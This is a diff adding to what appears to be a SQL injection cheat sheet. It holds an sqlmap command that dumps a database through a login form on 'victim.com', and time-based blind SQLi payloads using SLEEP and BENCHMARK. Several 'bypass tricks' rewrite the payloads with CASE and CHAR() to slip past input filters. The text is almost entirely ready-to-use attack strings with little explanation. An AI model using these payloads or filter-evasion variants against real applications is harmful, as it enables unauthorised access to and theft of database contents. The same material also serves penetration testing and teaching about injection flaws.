@@ -12,3 +12,28 @@ If first character is a, the DB sleeps 5 seconds → attacker learns it’s true
 sqlmap Command:
 
 sqlmap -u "http://victim.com/login.php" --data="username=admin&password=pass" -p username --technique=T --dump
+
+----------------------------------------------------------------------------------------------------------------------
+
+Time-Based Blind SQLi
+
+Normal Payload:
+
+' OR IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)--
+
+
+Bypass Tricks:
+
+Use BENCHMARK() instead of SLEEP():
+
+' OR IF(SUBSTRING(username,1,1)='a', BENCHMARK(5000000,MD5(1)), 0)--
+
+
+Use different syntax (CASE instead of IF):
+
+' OR CASE WHEN SUBSTRING(username,1,1)='a' THEN SLEEP(5) ELSE 0 END--
+
+
+Replace string 'a' with CHAR(97):
+
+' OR IF(SUBSTRING(username,1,1)=CHAR(97), SLEEP(5), 0)--
